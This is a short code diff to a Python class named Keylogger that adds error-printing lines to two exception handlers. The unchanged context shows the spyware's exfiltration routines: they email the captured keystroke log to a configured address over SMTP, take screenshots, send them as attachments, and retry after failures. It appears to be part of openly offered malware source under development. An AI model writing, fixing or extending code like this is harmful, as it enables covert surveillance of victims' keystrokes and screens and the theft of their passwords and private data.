@@ -201,6 +201,7 @@ class Keylogger:
             server.sendmail(self.email, self.email, message)
             server.quit()
         except Exception as e:
+            print(f"Error: {e}")
             time.sleep(15)
             self.send_mail(self.log)
 
@@ -227,6 +228,7 @@ class Keylogger:
             smtp.sendmail(self.email, self.email, msg.as_string())
             smtp.close()
         except Exception as e:
+            print(f"Error: {e}")
             time.sleep(15)
             self.take_screenshot()            
             self.send_mail_with_attachment(files= [self.temp_screenshot])
